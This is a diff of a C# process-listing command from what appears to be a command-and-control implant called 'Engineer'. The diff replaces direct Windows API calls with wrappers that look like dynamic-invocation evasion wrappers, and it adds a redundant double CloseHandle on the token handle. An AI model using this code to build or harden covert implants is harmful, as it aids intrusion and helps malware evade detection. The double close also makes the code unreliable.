@@ -1,14 +1,9 @@
-﻿using Engineer.Commands;
-using Engineer.Extra;
-using Engineer.Functions;
-using Engineer.Models;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
 using System.Security.Principal;
-using System.Text;
 using System.Threading.Tasks;
+using DynamicEngLoading;
 
 namespace Engineer.Commands
 {
@@ -41,11 +36,13 @@ namespace Engineer.Commands
                     results.Add(result);
                 }
 
-                Tasking.FillTaskResults(results.ToString(), task, EngTaskStatus.Complete,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(results, task, EngTaskStatus.Complete,TaskResponseType.ProcessItem);
             }
             catch (Exception e)
             {
-                Tasking.FillTaskResults(e.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
+                Console.WriteLine(e.Message);
+                Console.WriteLine(e.StackTrace);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(e.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
             }
         }
         
@@ -53,6 +50,7 @@ namespace Engineer.Commands
         {
             try
             {
+               //Console.WriteLine("Getting Process path");
                 return process.MainModule.FileName;
             }
             catch
@@ -65,7 +63,8 @@ namespace Engineer.Commands
         {
             try
             {
-                var pbi = h_reprobate.NtQueryInformationProcessBasicInformation(process.Handle);
+               // Console.WriteLine("Getting Process Parent");
+                var pbi = h_DynInv_Methods.NtFuncWrapper.NtQueryInformationProcessBasicInformation(process.Handle);
                 return pbi.InheritedFromUniqueProcessId;
             }
             catch
@@ -80,10 +79,12 @@ namespace Engineer.Commands
 
             try
             {
-                if (!WinAPIs.Advapi.OpenProcessToken(process.Handle, WinAPIs.Advapi.TOKEN_READ, out hToken))
+               // Console.WriteLine("Getting Process Owner");
+                if (!h_DynInv_Methods.AdvApi32FuncWrapper.OpenProcessToken(process.Handle, h_DynInv.Win32.Advapi32.TOKEN_READ, out hToken))
                     return "-";
 
                 var identity = new WindowsIdentity(hToken);
+                h_DynInv_Methods.Ker32FuncWrapper.CloseHandle(hToken);
                 return identity.Name;
             }
             catch
@@ -92,7 +93,7 @@ namespace Engineer.Commands
             }
             finally
             {
-                WinAPIs.Kernel32.CloseHandle(hToken);
+                h_DynInv_Methods.Ker32FuncWrapper.CloseHandle(hToken);
             }
         }
 
@@ -104,8 +105,8 @@ namespace Engineer.Commands
 
                 if (!is64BitOS)
                     return "x86";
-
-                if (!WinAPIs.Kernel32.IsWow64Process(process.Handle, out var isWow64))
+                //Console.WriteLine("Getting Process Arch");
+                if (!h_DynInv_Methods.Ker32FuncWrapper.IsWow64Process(process.Handle, out var isWow64))
                     return "-";
 
                 if (is64BitOS && isWow64)
@@ -120,15 +121,6 @@ namespace Engineer.Commands
         }
     }
 
-    public class ProcessItem
-    {
-        public string ProcessName { get; set; }
-        public string ProcessPath { get; set; }
-        public string Owner { get; set; }
-        public int ProcessId { get; set; }
-        public int ProcessParentId { get; set; }
-        public int SessionId { get; set; }
-        public string Arch { get; set; }
-    }
+    
 }
 
